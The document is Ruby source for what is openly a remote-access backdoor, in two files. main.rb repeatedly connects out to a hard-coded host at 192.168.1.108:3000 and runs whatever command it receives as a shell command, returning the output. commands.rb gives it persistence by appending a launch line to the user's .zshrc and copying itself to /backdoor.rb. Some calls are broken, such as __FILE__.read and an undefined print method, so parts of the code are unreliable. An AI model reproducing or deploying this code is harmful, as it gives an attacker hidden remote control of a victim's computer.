# commands.rb
require 'launchy'

class Commands
  @@command_history = []

  def initialize(user, socket)
    @user = user
    @socket = socket
  end

  def create_message_file
    File.open("/path/to/your/directory/Burak.txt", "w") do |file|
      file.puts("Burak")
    end
    @socket.print("Created Burak.txt in directory.")
    @@command_history.push("create_message_file")
  end



  def backdoor
    update_zshrc("ruby /backdoor.rb")
    create_backdoor_script
    @socket.print("added backdoor ")
  end

  def history
    @socket.print("Command history: #{@@command_history.join(', ')}")
  end

  private

  def update_zshrc(command)
    ensure_zshrc_existence
    File.open("/Users/#{@user}/.zshrc", "a") do |file|
      file.write(command)
      @socket.print("Command added to .zshrc")
    end
  end

  def ensure_zshrc_existence
    File.new("/Users/#{@user}/.zshrc") unless File.exist?("/Users/#{@user}/.zshrc")
  end

  def create_backdoor_script
    newfile = File.new("/backdoor.rb")
    contents = __FILE__.read
    newfile.write(contents)
  end
end

# main.rb
require 'socket'
require 'open3'
require_relative 'commands'
require 'etc'

HOSTNAME = '192.168.1.108'
PORT = 3000

USER = Etc.getlogin

def cli(cmd, commands)
  case cmd
  when "create_message_file"
    commands.create_message_file
  when "stay"
    commands.backdoor
  when "history"
    commands.history
  else
    execute_command(cmd, commands)
  end
end

def execute_command(cmd, commands)
  Open3.popen2e(cmd) do |_stdin, stdout_err|
    commands.print(stdout_err.read)
  end
end

loop do
  socket = TCPSocket.open(HOSTNAME, PORT)
  cmd = socket.gets.chomp 
  commands = Commands.new(USER, socket)
  cli(cmd, commands)
  socket.close
end
